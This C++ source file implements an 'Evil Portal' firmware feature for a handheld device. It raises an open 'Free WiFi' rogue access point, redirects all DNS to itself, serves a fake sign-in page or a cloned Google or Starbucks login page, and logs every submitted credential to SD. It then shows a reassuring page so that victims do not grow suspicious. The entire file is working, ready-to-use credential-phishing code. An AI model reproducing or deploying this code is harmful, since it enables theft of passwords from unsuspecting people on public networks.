// ===================================================================
// bySaw Evil Portal
//
// Brings up an OPEN rogue access point ("Free WiFi") with a captive portal:
//   * a DNS server that answers every lookup with the AP's own IP, and
//   * a web server that serves a login page to every request.
// When a victim joins and submits the form, every field is harvested to
// /evil_portal/creds-*.csv. The login page is loaded from SD
// (/evil_portal/index.html) when present, so you can drop in cloned templates
// (Google, Starbucks, router-firmware, ...); otherwise a built-in generic
// "WiFi sign-in" page is used. SELECT exits.
//
// Stock already had a Captive Portal; this adds SD template support + a clean
// standalone capture log (Bruce / Evil-Cardputer style).
// ===================================================================
#include "config.h"
#include "shared.h"
#include "EvilPortal.h"
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <SD.h>

extern TFT_eSPI tft;
extern bool feature_active;
extern bool feature_exit_requested;
bool featureExitButtonPressed();

namespace EvilPortal {

static const char *AP_SSID = "Free WiFi";
static const byte DNS_PORT = 53;

static DNSServer s_dns;
static WebServer s_web(80);
static File s_csv;
static bool s_csvOpen = false;
static String s_template;     // page HTML (SD template or built-in)
static String s_apIp;         // captive redirect target = our own AP IP
static int s_captured = 0;
static int s_hits = 0;        // page views
static volatile bool s_dirty = true;

// Built-in generic captive login page (used when no SD template is present).
static const char *kDefaultPage =
    "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,"
    "initial-scale=1'><title>WiFi Login</title><style>body{font-family:Arial,sans-serif;"
    "background:#f2f2f2;margin:0}.c{max-width:340px;margin:48px auto;background:#fff;"
    "padding:28px;border-radius:10px;box-shadow:0 2px 8px rgba(0,0,0,.15)}h2{text-align:center;"
    "color:#333}input{width:100%;padding:11px;margin:7px 0;border:1px solid #ccc;border-radius:6px;"
    "box-sizing:border-box}button{width:100%;padding:12px;background:#1a73e8;color:#fff;border:0;"
    "border-radius:6px;font-size:16px;margin-top:8px}p{color:#888;font-size:12px;text-align:center}"
    "</style></head><body><div class='c'><h2>Sign in to WiFi</h2>"
    "<form method='POST' action='/login'>"
    "<input name='username' placeholder='Email or username' autocomplete='username'>"
    "<input name='password' type='password' placeholder='Password' autocomplete='current-password'>"
    "<button type='submit'>Connect</button></form>"
    "<p>Accept the terms to access the internet</p></div></body></html>";

static void loadTemplate() {
  s_template = "";
  if (SD.cardType() != CARD_NONE && SD.exists("/evil_portal/index.html")) {
    File f = SD.open("/evil_portal/index.html", FILE_READ);
    if (f) {
      size_t sz = f.size();
      if (sz > 24576) sz = 24576;          // hard cap so a huge file can't OOM us
      s_template.reserve(sz + 1);          // single alloc, avoid byte-by-byte realloc churn
      while (f.available() && s_template.length() < sz) s_template += (char)f.read();
      f.close();
      Serial.printf("[evil] loaded SD template (%d bytes)\n", s_template.length());
    }
  }
  if (s_template.length() == 0) {
    s_template = kDefaultPage;
    Serial.println("[evil] using built-in template");
  }
}

static void handleRoot() {
  s_hits++;
  s_dirty = true;
  s_web.send(200, "text/html", s_template);
}

// OS captive-portal probes -> bounce to our own portal so the "sign in" sheet pops
// (redirecting to a real third-party IP can make the OS think internet is up).
static void handleRedirect() {
  s_web.sendHeader("Location", "http://" + s_apIp + "/", true);
  s_web.send(302, "text/plain", "");
}

static void handleLogin() {
  String rec = "";
  for (int i = 0; i < s_web.args(); i++) {
    if (i) rec += " | ";
    rec += s_web.argName(i) + "=" + s_web.arg(i);
  }
  Serial.printf("[evil] CAPTURED: %s\n", rec.c_str());
  if (s_csvOpen) {
    s_csv.printf("%lu,%s\n", (unsigned long)(millis() / 1000), rec.c_str());
    s_csv.flush();
  }
  s_captured++;
  s_dirty = true;
  // reassure the victim so they keep trying / don't get suspicious
  s_web.send(200, "text/html",
             "<html><head><meta http-equiv='refresh' content='4;url=/'></head><body "
             "style='font-family:Arial;text-align:center;margin-top:60px'>"
             "<h3>Connecting...</h3><p>Please wait while we verify your access.</p></body></html>");
}

static void draw() {
  tft.fillScreen(UI_BG);
  tft.setTextFont(1);
  tft.setTextColor(UI_ICON, UI_BG);
  tft.setTextSize(2);
  tft.drawCentreString("Evil Portal", tft.width() / 2, 8, 1);

  tft.setTextSize(1);
  int y = 44;
  tft.setTextColor(UI_TEXT, UI_BG);
  tft.setCursor(10, y); tft.printf("AP:   %s", AP_SSID); y += 18;
  tft.setCursor(10, y); tft.print("IP:   "); tft.print(WiFi.softAPIP()); y += 18;
  tft.setCursor(10, y); tft.printf("Tmpl: %s", (s_template == kDefaultPage) ? "built-in" : "SD"); y += 24;

  tft.setTextColor(UI_OK, UI_BG);
  tft.setTextSize(2);
  tft.setCursor(10, y); tft.printf("Clients: %d", WiFi.softAPgetStationNum()); y += 26;
  tft.setCursor(10, y); tft.printf("Views:   %d", s_hits); y += 26;
  tft.setTextColor(UI_WARN, UI_BG);
  tft.setCursor(10, y); tft.printf("Creds:   %d", s_captured); y += 26;

  tft.setTextSize(1);
  tft.setTextColor(UI_DIM_TEXT, UI_BG);
  tft.drawCentreString("SEL: exit", tft.width() / 2, tft.height() - 12, 1);
}

void run() {
  feature_active = true;
  feature_exit_requested = false;
  pauseBackgroundRadioTasks();
  s_captured = 0;
  s_hits = 0;
  s_dirty = true;

  tft.fillScreen(UI_BG);
  tft.setTextColor(UI_ICON, UI_BG);
  tft.setTextSize(2);
  tft.drawCentreString("Evil Portal", tft.width() / 2, 8, 1);

  if (SD.cardType() != CARD_NONE) {
    SD.mkdir("/evil_portal");
    char path[48];
    snprintf(path, sizeof(path), "/evil_portal/creds-%lu.csv", (unsigned long)(millis() / 1000));
    s_csv = SD.open(path, FILE_WRITE);
    if (s_csv) { s_csvOpen = true; s_csv.print("uptime_s,fields\n"); Serial.printf("[evil] log %s\n", path); }
  }
  loadTemplate();

  WiFi.mode(WIFI_AP);
  WiFi.softAP(AP_SSID);            // open network
  delay(200);
  IPAddress ip = WiFi.softAPIP();
  s_apIp = ip.toString();          // used by captive-probe redirects
  s_dns.start(DNS_PORT, "*", ip);  // resolve every host to us

  s_web.on("/", handleRoot);
  s_web.on("/login", HTTP_POST, handleLogin);
  s_web.on("/login", HTTP_GET, handleRoot);
  // common OS connectivity-check endpoints -> force the captive sheet
  s_web.on("/generate_204", handleRedirect);
  s_web.on("/gen_204", handleRedirect);
  s_web.on("/hotspot-detect.html", handleRoot);
  s_web.on("/ncsi.txt", handleRedirect);
  s_web.on("/connecttest.txt", handleRedirect);
  s_web.onNotFound(handleRoot);
  s_web.begin();
  Serial.printf("[evil] AP '%s' up at %s\n", AP_SSID, ip.toString().c_str());

  draw();
  uint32_t lastDraw = millis();
  int lastClients = -1;
  while (!feature_exit_requested && !featureExitButtonPressed()) {
    s_dns.processNextRequest();
    s_web.handleClient();
    int clients = WiFi.softAPgetStationNum();
    if (s_dirty || clients != lastClients || millis() - lastDraw > 1000) {
      draw();
      s_dirty = false;
      lastClients = clients;
      lastDraw = millis();
    }
    delay(2);
  }

  s_web.stop();
  s_dns.stop();
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_STA);
  if (s_csvOpen) { s_csv.flush(); s_csv.close(); s_csvOpen = false; }
  Serial.printf("[evil] stopped: %d creds, %d views\n", s_captured, s_hits);
}

}  // namespace EvilPortal
